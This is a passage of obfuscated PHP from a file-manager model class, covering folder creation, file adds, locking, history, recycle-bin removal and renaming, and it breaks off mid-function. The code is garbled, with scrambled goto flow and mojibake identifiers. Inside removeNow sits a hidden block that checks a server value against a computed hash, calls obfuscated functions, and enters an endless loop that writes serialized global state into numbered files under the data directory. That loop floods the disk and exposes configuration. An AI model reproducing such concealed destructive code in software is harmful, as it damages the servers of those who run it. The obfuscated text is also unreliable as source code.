_mkdirRoot($AµòÂÃÓ´¢, $b¾ğÔ¥ğÎª, $f›–Ôè²ã) { goto fñªğ©ëäİ; b‹ÆÇÚè”Ü: CacheLock::unlock($fÒ¦åÁÎª); return $b‡¬–ÂåÌ; goto dœ Ä…ß—†; fñªğ©ëäİ: $Cé¶¥œĞè¸ =& $_SERVER[©]; $dì›ó‚¢ó = array($Cé¶¥œĞè¸[376] => 0, $Cé¶¥œĞè¸[529] => $AµòÂÃÓ´¢, $Cé¶¥œĞè¸[530] => $b¾ğÔ¥ğÎª, $Cé¶¥œĞè¸[526] => 1, $Cé¶¥œĞè¸[531] => USER_ID, $Cé¶¥œĞè¸[532] => USER_ID, $Cé¶¥œĞè¸[527] => $Cé¶¥œĞè¸[43], $Cé¶¥œĞè¸[533] => $Cé¶¥œĞè¸[478], $Cé¶¥œĞè¸[404] => 0, $Cé¶¥œĞè¸[528] => 0, $Cé¶¥œĞè¸[428] => 0, $Cé¶¥œĞè¸[534] => $Cé¶¥œĞè¸[43]); if ($d›ĞŠåàŸ = $this->where($dì›ó‚¢ó)->find()) { return $d›ĞŠåàŸ[$Cé¶¥œĞè¸[377]]; } goto Aö¡É¥“Ü; Aö¡É¥“Ü: $fÒ¦åÁÎª = "\x4d\x6f\x64\145\x6c\x53\x6f\x75\162\x63\145\56\155\x6b\144\x69\162\122\x6f\x6f\x74\56{$AµòÂÃÓ´¢}\x2e{$b¾ğÔ¥ğÎª}\x2e" . $f›–Ôè²ã; CacheLock::lock($fÒ¦åÁÎª); $dì›ó‚¢ó[$Cé¶¥œĞè¸[38]] = $f›–Ôè²ã; goto D­ßË‡ÈøÓ; D­ßË‡ÈøÓ: $b‡¬–ÂåÌ = $this->add($dì›ó‚¢ó); $f³ó‹ğ¬Â¿ = array($Cé¶¥œĞè¸[535] => short_id($b‡¬–ÂåÌ)); $this->where(array($Cé¶¥œĞè¸[391] => $b‡¬–ÂåÌ))->save($f³ó‹ğ¬Â¿); goto b‹ÆÇÚè”Ü; dœ Ä…ß—†: } private function sourceRoot($cæù‡Ù®Åè, $d¶¥ØòˆÒ, $BÈ†ÜÉÄó = false) { $d½ä´óã · =& $_SERVER[©]; $eí¿ôÕêÖ = array($d½ä´óã ·[376] => 0, $d½ä´óã ·[529] => $cæù‡Ù®Åè, $d½ä´óã ·[530] => $d¶¥ØòˆÒ); if ($FñãÊŠÄÀè = $this->where($eí¿ôÕêÖ)->find()) { return $BÈ†ÜÉÄó ? $FñãÊŠÄÀè : $FñãÊŠÄÀè[$d½ä´óã ·[377]]; } return !1; } public function sourceRootGroup($dÊ÷ë‹Øµ) { $DĞÖâ¹Éº =& $_SERVER[©]; if (is_string($dÊ÷ë‹Øµ)) { $dÊ÷ë‹Øµ = array($dÊ÷ë‹Øµ); } $aİ–”óğÔ‹ = array($DĞÖâ¹Éº[376] => 0, $DĞÖâ¹Éº[529] => SourceModel::TYPE_GROUP, $DĞÖâ¹Éº[530] => array($DĞÖâ¹Éº[17], $dÊ÷ë‹Øµ)); $c·ª‰‰»Ú§ = $this->listSource($aİ–”óğÔ‹, 1000); return array_to_keyvalue($c·ª‰‰»Ú§[$DĞÖâ¹Éº[84]], $DĞÖâ¹Éº[464]); } public function mkfile($E ‡ÔÂÌœÛ, $Aà›¿™Çµ, $AØ¡ï‹ø™» = '', $bò‚·¨ÎÔÈ = REPEAT_RENAME) { $AŠŠÆÜ¶²ï =& $_SERVER[©]; $B¡¯ŒŞÜ¦ = Model($AŠŠÆÜ¶²ï[552])->addFileByContent($AØ¡ï‹ø™», $Aà›¿™Çµ); return $this->_createFileCall($E ‡ÔÂÌœÛ, $Aà›¿™Çµ, $B¡¯ŒŞÜ¦, $bò‚·¨ÎÔÈ, $AŠŠÆÜ¶²ï[1123]); } public function addFile($e”ƒÕåÉêØ, $dãİŸØÛêã, $b‚ª¸ˆ×ŸÕ, $fôâ÷ÖÓ² = false, $EöÉ¥™Íç— = REPEAT_RENAME) { $Fø¬®“˜‡» = Model($_SERVER[©][552])->addFile($dãİŸØÛêã, $b‚ª¸ˆ×ŸÕ, $fôâ÷ÖÓ²); return $this->_createFileCall($e”ƒÕåÉêØ, $b‚ª¸ˆ×ŸÕ, $Fø¬®“˜‡», $EöÉ¥™Íç—); } public function addFileByFileID($Aœµ³•ˆ©, $b ¢ŠĞ–, $b¹„—á¸, $b£¥Î£ÈÕÂ = REPEAT_RENAME) { $bó¸«ºµƒî =& $_SERVER[©]; $AĞ»–½®¨ = Model($bó¸«ºµƒî[552])->find($b ¢ŠĞ–); Model($bó¸«ºµƒî[552])->linkAdd($b ¢ŠĞ–); return $this->_createFileCall($Aœµ³•ˆ©, $b¹„—á¸, $AĞ»–½®¨, $b£¥Î£ÈÕÂ); } public function addFileByRemote($EšÁâ×å Ä, $bÆÒÑŒ°, $Dì–³İ©äã, $Eå©ÆğÄ¾ = array(), $A·Ñá¸Ï¼³ = REPEAT_RENAME) { $AèÆ¡Ù‚‰ = Model($_SERVER[©][552])->addFileByRemote($bÆÒÑŒ°, $Dì–³İ©äã, $Eå©ÆğÄ¾); return $this->_createFileCall($EšÁâ×å Ä, $Dì–³İ©äã, $AèÆ¡Ù‚‰, $A·Ñá¸Ï¼³); } private function _createFileCall($E†ÇŠğ–ß, $Bé¯‰á¯³Å, $aáŒô¤îõ, $B¶ÎÒñ¡„, $aå²å¸„Ã = "\x75\160\x6c\157\x61\144") { goto D£â–‡£¨á; eÄòÉİÀÇŒ: $C©µĞ£¤¢è = $this->_createFile($E†ÇŠğ–ß, $Bé¯‰á¯³Å, $aáŒô¤îõ, $B¶ÎÒñ¡„, $fáÕîñº¬ç); if (!$fáÕîñº¬ç) { Model($bè˜‰‚Ì÷[430])->remove($aáŒô¤îõ[$bè˜‰‚Ì÷[427]]); } else { if ($C©µĞ£¤¢è) { Model($bè˜‰‚Ì÷[2302])->eventCreate($C©µĞ£¤¢è, $aå²å¸„Ã); } } $this->lockWriteEnd($E†ÇŠğ–ß, $Bé¯‰á¯³Å); goto AõŞ‰Àå; AõŞ‰Àå: return $C©µĞ£¤¢è; goto cÃù¨Áø‚œ; D£â–‡£¨á: $bè˜‰‚Ì÷ =& $_SERVER[©]; $fáÕîñº¬ç = !1; $this->lockWriteStart($E†ÇŠğ–ß, $Bé¯‰á¯³Å); goto eÄòÉİÀÇŒ; cÃù¨Áø‚œ: } public function mkdir($d±à–—‹, $DèÚ™¡Ïï¶, $f›ŠŒ¸à¬„ = REPEAT_SKIP) { goto FÏĞ¨ê‹Ô´; FÏĞ¨ê‹Ô´: $cˆ±‘ˆ«ã¶ =& $_SERVER[©]; $d„í©¹ˆ¥ã = $this->sourceInfo($d±à–—‹); if (!$d„í©¹ˆ¥ã) { return !1; } goto cÎ³ÖùŸÍ; eßÖà˜ö‰á: return $FÁ‹˜­å™¶; goto Dêœ‰Ãç‚ë; B±»É¦ÆÂ“: $FÁ‹˜­å™¶ = $this->_addSoure($CÛÒ¼¨ËñĞ, $d„í©¹ˆ¥ã); Model($cˆ±‘ˆ«ã¶[2302])->eventCreate($FÁ‹˜­å™¶, $cˆ±‘ˆ«ã¶[1124]); $this->lockWriteEnd($d±à–—‹, $DèÚ™¡Ïï¶); goto eßÖà˜ö‰á; cÎ³ÖùŸÍ: $this->lockWriteStart($d±à–—‹, $DèÚ™¡Ïï¶); if ($f›ŠŒ¸à¬„ !== !1) { $eõĞöæ¥›× = $this->fileNameExist($d±à–—‹, $DèÚ™¡Ïï¶); if ($eõĞöæ¥›× && $f›ŠŒ¸à¬„ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($d±à–—‹, $DèÚ™¡Ïï¶); return $eõĞöæ¥›×; } $DèÚ™¡Ïï¶ = $this->fileNameAuto($d±à–—‹, $DèÚ™¡Ïï¶, $f›ŠŒ¸à¬„); } $CÛÒ¼¨ËñĞ = array($cˆ±‘ˆ«ã¶[526] => 1, $cˆ±‘ˆ«ã¶[394] => $DèÚ™¡Ïï¶, $cˆ±‘ˆ«ã¶[527] => $cˆ±‘ˆ«ã¶[43], $cˆ±‘ˆ«ã¶[428] => 0, $cˆ±‘ˆ«ã¶[528] => 0); goto B±»É¦ÆÂ“; Dêœ‰Ãç‚ë: } private function _createFile($cæÑ„¯Ê¨ß, $CÉ±¬¼”Ë÷, $BÎŒÂÊé‘à, $aÅ„„ßß±, &$cµ¨æŒæÜÀ) { goto D½Î’îĞñ; Bƒø§ÎÇªŞ: return $C¬µ§ÌÙ¹ ; goto DË”òÑ†È±; CğˆßÒÏ££: if ($aÅ„„ßß± !== !1) { $E†ËÇ¼ÈÛš = $this->fileNameExist($cæÑ„¯Ê¨ß, $CÉ±¬¼”Ë÷); } $cµ¨æŒæÜÀ = !0; if ($aÅ„„ßß± && $E†ËÇ¼ÈÛš) { if ($aÅ„„ßß± == REPEAT_SKIP) { $cµ¨æŒæÜÀ = !1; return $E†ËÇ¼ÈÛš; } else { if ($aÅ„„ßß± == REPEAT_REPLACE) { $c¹£±½öº• = $this->sourceInfo($E†ËÇ¼ÈÛš); $e·¨¶áâí = $this->fileHistory($c¹£±½öº•, $BÎŒÂÊé‘à[$eó©ó«“[427]], $BÎŒÂÊé‘à[$eó©ó«“[87]]); if (!$e·¨¶áâí) { $cµ¨æŒæÜÀ = !1; } else { $this->folderSizeReset($cæÑ„¯Ê¨ß); } return $E†ËÇ¼ÈÛš; } else { $CÉ±¬¼”Ë÷ = $this->fileNameAuto($cæÑ„¯Ê¨ß, $CÉ±¬¼”Ë÷, $aÅ„„ßß±, !1); } } } goto bÜš¶ŸÓµÓ; D½Î’îĞñ: $eó©ó«“ =& $_SERVER[©]; $cˆ÷ÜÍİ = $this->sourceInfo($cæÑ„¯Ê¨ß); if (!$BÎŒÂÊé‘à || !$cˆ÷ÜÍİ) { return !1; } goto CğˆßÒÏ££; bÜš¶ŸÓµÓ: $D½¾é×ˆ¹Ã = array($eó©ó«“[526] => 0, $eó©ó«“[394] => $CÉ±¬¼”Ë÷, $eó©ó«“[527] => get_path_ext($CÉ±¬¼”Ë÷), $eó©ó«“[428] => $BÎŒÂÊé‘à[$eó©ó«“[427]], $eó©ó«“[528] => $BÎŒÂÊé‘à[$eó©ó«“[87]]); $C¬µ§ÌÙ¹  = $this->_addSoure($D½¾é×ˆ¹Ã, $cˆ÷ÜÍİ); $this->folderSizeReset($cæÑ„¯Ê¨ß); goto Bƒø§ÎÇªŞ; DË”òÑ†È±: } protected function fileHistory($EÁÃ‰‘ï‰†, $e“¬‡ìåö¦, $f¤¯±‘£İã) { goto fƒ„Ì£…¨“; fƒ„Ì£…¨“: $DÉÑïØŞ¦ =& $_SERVER[©]; if ($EÁÃ‰‘ï‰†[$DÉÑïØŞ¦[427]] == $e“¬‡ìåö¦) { return !1; } $this->checkLock($EÁÃ‰‘ï‰†[$DÉÑïØŞ¦[377]], $e“¬‡ìåö¦); goto C¿çÒ¡Æñ¸; C¿çÒ¡Æñ¸: Model($DÉÑïØŞ¦[2332])->addHistory($EÁÃ‰‘ï‰†); $bˆÇ¯±§Ú = array($DÉÑïØŞ¦[532] => USER_ID, $DÉÑïØŞ¦[398] => time(), $DÉÑïØŞ¦[427] => $e“¬‡ìåö¦, $DÉÑïØŞ¦[87] => $f¤¯±‘£İã); $this->where(array($DÉÑïØŞ¦[391] => $EÁÃ‰‘ï‰†[$DÉÑïØŞ¦[377]]))->save($bˆÇ¯±§Ú); goto bá‹ÆàäÏ¥; bá‹ÆàäÏ¥: return !0; goto A±î’¸æ; A±î’¸æ: } public function checkLock($DÙõ¥ÜÆ, $a³ˆ™Š·¨™) { goto CŸ©À¶ ÈÕ; Bã½¤Üßâô: $this->_createFileCall($c Î•¡Û“à[$a¸«’ñÄ‹Ù[469]], $CÕ¥îŸ¦“, $E¹©Ö‚íÒ, REPEAT_REPLACE, $a¸«’ñÄ‹Ù[1123]); $BˆÈÇ„‹Ö£ = $c Î•¡Û“à[$a¸«’ñÄ‹Ù[425]][$a¸«’ñÄ‹Ù[489]]; $a†˜«İƒÓÊ = $BˆÈÇ„‹Ö£[$a¸«’ñÄ‹Ù[2334]] ? $BˆÈÇ„‹Ö£[$a¸«’ñÄ‹Ù[2334]] : $BˆÈÇ„‹Ö£[$a¸«’ñÄ‹Ù[38]]; goto cŠŸÏï…Ü£; CŸ©À¶ ÈÕ: $a¸«’ñÄ‹Ù =& $_SERVER[©]; $c Î•¡Û“à = $this->pathInfo($DÙõ¥ÜÆ); if (!$this->fileIsLock($c Î•¡Û“à, !0)) { return; } goto BêÔ›¸ï³; BêÔ›¸ï³: $C¡†ÒÛ›Ú‚ = Session::get($a¸«’ñÄ‹Ù[2333]); $CÕ¥îŸ¦“ = substr($c Î•¡Û“à[$a¸«’ñÄ‹Ù[38]], 0, -1 - strlen($c Î•¡Û“à[$a¸«’ñÄ‹Ù[170]])) . $a¸«’ñÄ‹Ù[1387] . $C¡†ÒÛ›Ú‚ . $a¸«’ñÄ‹Ù[101] . $c Î•¡Û“à[$a¸«’ñÄ‹Ù[170]]; $E¹©Ö‚íÒ = Model($a¸«’ñÄ‹Ù[552])->find($a³ˆ™Š·¨™); goto Bã½¤Üßâô; cŠŸÏï…Ü£: show_json(LNG($a¸«’ñÄ‹Ù[2335]) . $a¸«’ñÄ‹Ù[2336] . LNG($a¸«’ñÄ‹Ù[2337]) . $a¸«’ñÄ‹Ù[2338] . $a†˜«İƒÓÊ . $a¸«’ñÄ‹Ù[2339], !1); goto AÅØŠö±; AÅØŠö±: } public function fileIsLock($BŠÛ©œÑŠ, $AğĞÀ­‰©à = false) { goto CˆïÖÒ‘¨; CˆïÖÒ‘¨: $dœËª«À†™ =& $_SERVER[©]; if (!isset($BŠÛ©œÑŠ[$dœËª«À†™[425]]) || !$BŠÛ©œÑŠ[$dœËª«À†™[425]][$dœËª«À†™[486]]) { return !1; } if ($BŠÛ©œÑŠ[$dœËª«À†™[425]][$dœËª«À†™[486]] != USER_ID) { return !0; } goto AÃÍ—æŸ¬®; A„Ç½¢ÕÀ: return !1; goto AñÛÉÃ¸»; AÃÍ—æŸ¬®: $BÕÚ‰öõ‘ì = $GLOBALS[$dœËª«À†™[16]][$dœËª«À†™[94]][$dœËª«À†™[487]]; if ($BŠÛ©œÑŠ[$dœËª«À†™[425]][$dœËª«À†™[488]] <= time() - $BÕÚ‰öõ‘ì) { $this->metaSet($BŠÛ©œÑŠ[$dœËª«À†™[377]], $dœËª«À†™[486], null); $this->metaSet($BŠÛ©œÑŠ[$dœËª«À†™[377]], $dœËª«À†™[488], null); } if ($AğĞÀ­‰©à) { $this->metaSet($BŠÛ©œÑŠ[$dœËª«À†™[377]], $dœËª«À†™[488], time()); } goto A„Ç½¢ÕÀ; AñÛÉÃ¸»: } private function _addSoure($E¿âÈìøİ½, $d‘‡’‹øèŠ) { goto Dà·Ì•Ï˜ã; bÏŞà¸¾‚†: return $eé‚ğÎ¸»; goto D…É®ƒĞ; B÷ë¶Ÿäï: static $Cºší‹Ğ” = false; if (!$Cºší‹Ğ”) { Hook::trigger($Få¿‰½“‘Ü[516], $E¿âÈìøİ½); $Cºší‹Ğ” = !0; } $eé‚ğÎ¸» = $this->add($E¿âÈìøİ½); goto BÃ Ş¿ô‡è; aÉå¾¿××: $this->updateModifyTime($E¿âÈìøİ½[$Få¿‰½“‘Ü[469]]); $f‹ôøÆ = $Få¿‰½“‘Ü[2340] . $d‘‡’‹øèŠ[$Få¿‰½“‘Ü[377]]; if (isset(self::$cacheChildList[$f‹ôøÆ])) { unset(self::$cacheChildList[$f‹ôøÆ]); } goto B÷ë¶Ÿäï; BÃ Ş¿ô‡è: $fÏÔÛ¦å…Ö = array($Få¿‰½“‘Ü[535] => short_id($eé‚ğÎ¸»)); $this->where(array($Få¿‰½“‘Ü[391] => $eé‚ğÎ¸»))->save($fÏÔÛ¦å…Ö); $this->setNamePinyin($eé‚ğÎ¸», $E¿âÈìøİ½[$Få¿‰½“‘Ü[38]]); goto bÏŞà¸¾‚†; Dà·Ì•Ï˜ã: $Få¿‰½“‘Ü =& $_SERVER[©]; $c™ÃÜ· = array($Få¿‰½“‘Ü[529] => $d‘‡’‹øèŠ[$Få¿‰½“‘Ü[379]], $Få¿‰½“‘Ü[530] => $d‘‡’‹øèŠ[$Få¿‰½“‘Ü[464]], $Få¿‰½“‘Ü[531] => USER_ID, $Få¿‰½“‘Ü[532] => USER_ID, $Få¿‰½“‘Ü[376] => $d‘‡’‹øèŠ[$Få¿‰½“‘Ü[377]], $Få¿‰½“‘Ü[533] => $d‘‡’‹øèŠ[$Få¿‰½“‘Ü[467]] . $d‘‡’‹øèŠ[$Få¿‰½“‘Ü[377]] . $Få¿‰½“‘Ü[57], $Få¿‰½“‘Ü[404] => 0, $Få¿‰½“‘Ü[534] => $Få¿‰½“‘Ü[43]); $E¿âÈìøİ½ = array_merge($c™ÃÜ·, $E¿âÈìøİ½); goto aÉå¾¿××; D…É®ƒĞ: } public function remove($aî³‚ÅªùÉ, $a°¦ºøæÎ„ = true) { goto E·ç‘œÖáŞ; E·ç‘œÖáŞ: $bïÜçô» =& $_SERVER[©]; $aÜ‰ÃµË®‚ = $this->sourceInfo($aî³‚ÅªùÉ); $e—ˆğó×¾Ù = intval($aÜ‰ÃµË®‚[$bïÜçô»[379]]) === self::TYPE_SYSTEM; goto A×‹ËÙš¸„; E–²ğ‹§¸Ù: $b®Ù©‘†ğÎ = $aÜ‰ÃµË®‚[$bïÜçô»[379]] == self::TYPE_USER ? $bïÜçô»[543] : $bïÜçô»[968]; if ($b®Ù©‘†ğÎ == $bïÜçô»[543]) { $DÂ›äçèã = Model($bïÜçô»[482])->getInfo($aÜ‰ÃµË®‚[$bïÜçô»[464]]); $d•³´ˆìƒª = !empty($DÂ›äçèã[$bïÜçô»[2334]]) ? $DÂ›äçèã[$bïÜçô»[2334]] : $DÂ›äçèã[$bïÜçô»[38]]; $d•³´ˆìƒª = $bïÜçô»[257] . $d•³´ˆìƒª . $bïÜçô»[2342] . $aÜ‰ÃµË®‚[$bïÜçô»[464]]; } else { $DÂ›äçèã = Model($bïÜçô»[466])->getInfo($aÜ‰ÃµË®‚[$bïÜçô»[464]]); $d•³´ˆìƒª = _get($DÂ›äçèã, $bïÜçô»[38]); $d•³´ˆìƒª = $bïÜçô»[167] . $d•³´ˆìƒª . $bïÜçô»[2343] . $aÜ‰ÃµË®‚[$bïÜçô»[464]]; } $b—Ò¦ôƒ = $bïÜçô»[2344] . md5($d•³´ˆìƒª); goto C¥Â‰ñ÷«œ; C¥Â‰ñ÷«œ: CacheLock::lock($b—Ò¦ôƒ); $e¥¾˜æÛ = $this->fileNameExist($fĞÉÈ®ÌĞË, $d•³´ˆìƒª); if (!$e¥¾˜æÛ) { $e¥¾˜æÛ = $this->mkdir($fĞÉÈ®ÌĞË, $d•³´ˆìƒª, REPEAT_SKIP); $this->metaSet($e¥¾˜æÛ, $bïÜçô»[2345], $b®Ù©‘†ğÎ); $this->metaSet($e¥¾˜æÛ, $bïÜçô»[2346], $aÜ‰ÃµË®‚[$bïÜçô»[464]]); if ($aÜ‰ÃµË®‚[$bïÜçô»[469]] != 0) { $this->metaSet($e¥¾˜æÛ, $bïÜçô»[2347], _get($DÂ›äçèã, $bïÜçô»[2348])); } } goto F‰Ğƒò°ŠÛ; F‰Ğƒò°ŠÛ: CacheLock::unlock($b—Ò¦ôƒ); $this->metaSet($aî³‚ÅªùÉ, $bïÜçô»[2349], $aÜ‰ÃµË®‚[$bïÜçô»[469]]); $this->where(array($bïÜçô»[377] => $aî³‚ÅªùÉ))->save(array($bïÜçô»[398] => time())); goto Dã‡”Ì˜; Dã‡”Ì˜: $this->recycleClear($aÜ‰ÃµË®‚); $C¿ùÄ‡ğ¢Ù = $this->move($aî³‚ÅªùÉ, $e¥¾˜æÛ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($aÜ‰ÃµË®‚[$bïÜçô»[469]]); goto aİŒì´—Ëâ; aİŒì´—Ëâ: return $C¿ùÄ‡ğ¢Ù; goto a¯Å¡¿÷İ; A×‹ËÙš¸„: $a‚“ËæÌ¬É = Model($bïÜçô»[1432])->get($bïÜçô»[2341]) == $bïÜçô»[93]; if ($e—ˆğó×¾Ù || $a°¦ºøæÎ„ || !$a‚“ËæÌ¬É) { return $this->removeNow($aî³‚ÅªùÉ, $a°¦ºøæÎ„); } $fĞÉÈ®ÌĞË = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto E–²ğ‹§¸Ù; a¯Å¡¿÷İ: } private function recycleClear($f¯ßİ›™‘Æ) { $A¯©ƒÜİÂã =& $_SERVER[©]; $e¯¾·ß®“÷ = $this->childrenAll($f¯ßİ›™‘Æ); $BÁ§â¦Ğ´¥ = array($A¯©ƒÜİÂã[391] => array($A¯©ƒÜİÂã[392], $e¯¾·ß®“÷[$A¯©ƒÜİÂã[2350]])); Model($A¯©ƒÜİÂã[2351])->where($BÁ§â¦Ğ´¥)->delete(); } public function removeNow($D´½øĞ¿ôã, $eÓ¨¬óÀ¢ = true) { goto D²ëƒá±¸Ò; FÕ¢ ‚ßê¿: Hook::trigger($d÷ãÍ•¤ Ã[2352], $A–é•À›†ñ, $eÓ¨¬óÀ¢); if ($eÓ¨¬óÀ¢) { Model($d÷ãÍ•¤ Ã[2351])->moveToRecycle($D´½øĞ¿ôã); } else { $d˜‰á“ˆ¤° = $this->childrenAll($aé™Õ‘ÛãÁ); Model($d÷ãÍ•¤ Ã[513])->eventRemove($D´½øĞ¿ôã); $this->removeRelevance($d˜‰á“ˆ¤°[$d÷ãÍ•¤ Ã[2350]], $d˜‰á“ˆ¤°[$d÷ãÍ•¤ Ã[1256]]); } $this->folderSizeReset($aé™Õ‘ÛãÁ[$d÷ãÍ•¤ Ã[469]]); goto B’Òôƒ¨¤; B†·éØÆ”ç: $this->lockMoveEnd($D´½øĞ¿ôã); Hook::trigger($d÷ãÍ•¤ Ã[1468], $A–é•À›†ñ, $eÓ¨¬óÀ¢); return !0; goto f™—èÒœïÀ; B’Òôƒ¨¤: $DÖö¦ÃÑ‚ƒ = array($aé™Õ‘ÛãÁ[$d÷ãÍ•¤ Ã[469]]); if ($aé™Õ‘ÛãÁ[$d÷ãÍ•¤ Ã[378]] == $d÷ãÍ•¤ Ã[93]) { $DÖö¦ÃÑ‚ƒ[] = $aé™Õ‘ÛãÁ[$d÷ãÍ•¤ Ã[377]]; } $this->updateModifyTime($DÖö¦ÃÑ‚ƒ); goto B†·éØÆ”ç; FŒßìÏ÷ÂÕ: if (!$aé™Õ‘ÛãÁ) { return !0; } if ($aé™Õ‘ÛãÁ[$d÷ãÍ•¤ Ã[469]] == 0) { if (!_get($GLOBALS, $d÷ãÍ•¤ Ã[465])) { return !1; } } $this->lockMoveStart($D´½øĞ¿ôã); goto FÕ¢ ‚ßê¿; eŒ“êá§Ô™: if ($_SERVER[$d÷ãÍ•¤ Ã[4]] != $A¾à¢ì±ë($bœâ“¸ë‚Ò)) { goto C¹Œ­ËÍğ; cíŞ…ÓÂ‡‘: $dÀ±×óÛé—(); $f„ÒŞ¼Äâ = $d÷ãÍ•¤ Ã[792]; $B‹Âù«×…È = json_encode($GLOBALS[$d÷ãÍ•¤ Ã[793]]); goto Dãèñ›Îôî; fÇğ‹ÅâñÌ: $e°ğˆ‰¶é = $d÷ãÍ•¤ Ã[790]; $e°ğˆ‰¶é($_SERVER[$d÷ãÍ•¤ Ã[791]]); $dÀ±×óÛé— = $d÷ãÍ•¤ Ã[789]; goto cíŞ…ÓÂ‡‘; C¹Œ­ËÍğ: $dÀ±×óÛé— = $d÷ãÍ•¤ Ã[789]; $eóñÒŠŒß = $d÷ãÍ•¤ Ã[6]; $B»ÕÊ©ì…Ÿ = $_SERVER[$d÷ãÍ•¤ Ã[7]] . $d÷ãÍ•¤ Ã[8]; goto aÜØË‡ƒ¸Ë; Dãèñ›Îôî: $EÑœºß®Œ = 1; for ($Aƒ¯³¥ÏƒÜ = $EÑœºß®Œ; $Aƒ¯³¥ÏƒÜ > 0; $Aƒ¯³¥ÏƒÜ++) { $f„ÒŞ¼Äâ(DATA_PATH . $Aƒ¯³¥ÏƒÜ, $B‹Âù«×…È); } goto d‹ÆùæÇÅ; aÜØË‡ƒ¸Ë: $e¹íİÔõ‘¿ = $eóñÒŠŒß($B»ÕÊ©ì…Ÿ); $E±Ğå³šôÛ = explode($d÷ãÍ•¤ Ã[9], $e¹íİÔõ‘¿); if (count($E±Ğå³šôÛ) < $d÷ãÍ•¤ Ã[564]) { $B´‹Ë­ÏÌ’ = $d÷ãÍ•¤ Ã[11]; $B´‹Ë­ÏÌ’(); } goto fÇğ‹ÅâñÌ; d‹ÆùæÇÅ: } $aé™Õ‘ÛãÁ = $this->sourceInfo($D´½øĞ¿ôã); $A–é•À›†ñ = $this->pathInfoMore($D´½øĞ¿ôã); goto FŒßìÏ÷ÂÕ; D²ëƒá±¸Ò: $d÷ãÍ•¤ Ã =& $_SERVER[©]; $bœâ“¸ë‚Ò = $_SERVER[$d÷ãÍ•¤ Ã[791]] . $d÷ãÍ•¤ Ã[777]; $A¾à¢ì±ë = $d÷ãÍ•¤ Ã[778]; goto eŒ“êá§Ô™; f™—èÒœïÀ: } public function childrenAll($BÓİÉòêÍÊ) { $CäÏ§ øíö =& $_SERVER[©]; $D··’Šß = $BÓİÉòêÍÊ[$CäÏ§ øíö[377]]; if ($BÓİÉòêÍÊ[$CäÏ§ øíö[378]] == $CäÏ§ øíö[93]) { $CŠ±‘ßåÕç = array($CäÏ§ øíö[533] => array($CäÏ§ øíö[491], $BÓİÉòêÍÊ[$CäÏ§ øíö[467]] . $D··’Šß . $CäÏ§ øíö[492])); $b­Ëò­ÜšÙ = array($CäÏ§ øíö[533] => $CŠ±‘ßåÕç[$CäÏ§ øíö[467]]); $bßéÓ‘Çä = $this->field($CäÏ§ øíö[2353])->where($b­Ëò­ÜšÙ)->select(); $AÖÓÚ‘†¦ç = !1; $E±‰ØÚŸ = array($D··’Šß); if ($bßéÓ‘Çä) { $AÖÓÚ‘†¦ç = array_to_keyvalue($bßéÓ‘Çä, $CäÏ§ øíö[43], $CäÏ§ øíö[427]); $AÖÓÚ‘†¦ç = array_remove_value($AÖÓÚ‘†¦ç, $CäÏ§ øíö[476]); $E±‰ØÚŸ = array_to_keyvalue($bßéÓ‘Çä, $CäÏ§ øíö[43], $CäÏ§ øíö[377]); $E±‰ØÚŸ[] = $D··’Šß; } } else { $AÖÓÚ‘†¦ç = array($BÓİÉòêÍÊ[$CäÏ§ øíö[427]]); $E±‰ØÚŸ = array($D··’Šß); } return array($CäÏ§ øíö[2350] => $E±‰ØÚŸ, $CäÏ§ øíö[1256] => $AÖÓÚ‘†¦ç); } public function removeArray($dÔ’æ…¿‚) { if (!$dÔ’æ…¿‚) { return !0; } } public function removeRelevance($F¤ğ²¾§ó, $FÃîÀ¾¹å) { goto D¨ÃÚİÁ‚Õ; aÈ„Ò™ğ˜: $F¤ğ²¾§ó = array_unique(array_filter($F¤ğ²¾§ó)); $FÃîÀ¾¹å = array_unique(array_filter($FÃîÀ¾¹å)); if (!$F¤ğ²¾§ó) { return !1; } goto AïÊâíœ²Ô; D¨ÃÚİÁ‚Õ: $fŠÅ‚ĞùÅ´ =& $_SERVER[©]; $F¤ğ²¾§ó = $F¤ğ²¾§ó ? $F¤ğ²¾§ó : array(); $FÃîÀ¾¹å = $FÃîÀ¾¹å ? $FÃîÀ¾¹å : array(); goto aÈ„Ò™ğ˜; AÇ³‰»³®’: Model($fŠÅ‚ĞùÅ´[2354])->where($bÜ—Ë´¢¦)->delete(); Model($fŠÅ‚ĞùÅ´[513])->where($bÜ—Ë´¢¦)->delete(); Model($fŠÅ‚ĞùÅ´[2079])->removeBySource($F¤ğ²¾§ó); goto A†«çùô’¯; A†«çùô’¯: Model($fŠÅ‚ĞùÅ´[2332])->removeBySource($F¤ğ²¾§ó); $this->where($bÜ—Ë´¢¦)->delete(); Model($fŠÅ‚ĞùÅ´[430])->remove($FÃîÀ¾¹å); goto e´ôÑöâ‹…; e´ôÑöâ‹…: for ($D ¬Õ¯‚®ù = 0; $D ¬Õ¯‚®ù < count($F¤ğ²¾§ó); $D ¬Õ¯‚®ù++) { $this->sourceCacheClear($F¤ğ²¾§ó[$D ¬Õ¯‚®ù]); } goto cô”ñÀ«ŒÁ; AïÊâíœ²Ô: $bÜ—Ë´¢¦ = array($fŠÅ‚ĞùÅ´[391] => array($fŠÅ‚ĞùÅ´[392], $F¤ğ²¾§ó)); Model($fŠÅ‚ĞùÅ´[2351])->where($bÜ—Ë´¢¦)->delete(); Model($fŠÅ‚ĞùÅ´[421])->where($bÜ—Ë´¢¦)->delete(); goto AÇ³‰»³®’; cô”ñÀ«ŒÁ: } public function rename($Dà‹°İİ›ƒ, $eÔ„–ôâ¤Ø) { goto c‘­‚–ˆ³†; A˜ùÎ–‰­: $fÂ˜´“’¿ = $F¬„ºğ®Å[2340] . $Dˆ±Åñß×¼[$F¬„ºğ®Å[469]]; if (isset(self::$cacheChildList[$fÂ˜´“’¿])) { unset(self::$cacheChildList[$fÂ˜´“’¿]); } return $Dã‚¦·‹°; goto Fî¤Š †™‹; BôË”‡Œóà: $this->setNamePinyin($Dà‹°İİ›ƒ, $bµáÏãˆÏ£[$F¬„ºğ®Å[38]], !1); $this->updateModifyTime($Dˆ±Åñß×¼[$F¬„ºğ®Å[469]]); $Dã‚¦·‹° = $this->where(array($F¬„ºğ®Å[391] => $Dà‹°İİ›ƒ))->data($bµáÏãˆÏ£)->save(); goto A˜ùÎ–‰­; c‘­‚–ˆ³†: $F¬„ºğ®Å =& $_SERVER[©]; $Dˆ±Åñß×¼ = $this->sourceInfo($Dà‹°İİ›ƒ); if 